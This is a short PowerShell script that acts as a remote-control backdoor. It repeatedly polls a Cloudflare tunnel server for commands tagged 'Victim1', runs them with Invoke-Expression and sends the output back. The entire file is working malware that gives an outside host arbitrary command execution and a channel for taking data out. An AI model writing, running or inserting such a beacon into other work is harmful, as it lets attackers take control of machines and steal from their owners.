$server = "https://noble-scotia-titten-four.trycloudflare.com/"

while ($true) {
    $id = "Victim1"
    
    $cmd = Invoke-RestMethod -Uri "$server/get_command?id=$id" -Method GET
    
    if ($cmd -ne "None") {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        
        Invoke-RestMethod -Uri "$server/send_output" -Method POST -Body (@{ id=$id; output=$output } | ConvertTo-Json) -ContentType "application/json"
    }
    
    Start-Sleep -Seconds 30
}
